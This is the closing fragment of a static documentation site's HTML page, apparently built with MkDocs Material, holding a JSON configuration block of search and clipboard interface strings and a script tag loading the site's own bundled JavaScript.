      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
    
  </body>
</html>